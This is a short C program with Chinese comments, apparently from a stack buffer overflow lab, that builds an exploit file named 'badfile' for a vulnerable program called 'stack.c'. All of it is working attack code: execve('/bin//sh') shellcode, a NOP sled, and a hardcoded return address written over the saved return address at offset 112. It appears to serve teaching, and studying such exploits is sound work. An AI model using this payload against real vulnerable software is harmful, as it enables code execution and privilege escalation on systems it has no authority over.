/**
 * 用来生成包含恶意代码的文件
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/*shellcode暂时不关心，汇编和二进制的转换*/
char shellcode[]=
    "\x31\xc0"   /*xorl %eax,%eax*/
    "\x50"       /*pushl %eax*/
    "\x68""//sh" /*pushl $0x68732f2f*/
    "\x68""/bin" /*pushl $0x6e69622f*/
    "\x89\xe3"   /*movl %esp,%ebx*/
    "\x50"       /*pushl %eax*/
    "\x53"       /*pushl %ebx*/
    "\x89\xe1"   /*movl %esp,%ecx*/
    "\x99"       /*cdp*/
    "\xb0\x0b"   /*movb $0x0b,%al*/
    "\xcd\x80"   /*int $0x80*/
;

void main(){
     /*因为stack.c中一次最多读取300,我这里希望有更多的nop指令，增加命中概率*/
    char buffer[300];

    FILE *badfile;

    /*x86 CPU上的NOP指令实质上是XCHG EAX, EAX（操作码同为0x90）--无任何作用的指令。*/
    memset(&buffer,0x90,sizeof(buffer));

    /*原来的返回地址被nop覆盖，这里我们让它在本地，如果没有成功，增大它的值
     *因为书上说，调试的时候，会在栈的前面压入一些内容，而运行的时候没有
     *导致栈相对运行的时候，较深。
     */
    *((long *)(buffer+112)) = 0xbfffea98 + 0x80;

    /*将shellcode报错在最后*/
    memcpy(buffer+sizeof(buffer)-sizeof(shellcode),shellcode,sizeof(shellcode));

    /*将buffer写入文件*/
    badfile = fopen("badfile","w");
    fwrite(buffer,sizeof(char),sizeof(buffer),badfile);
    fclose(badfile);
}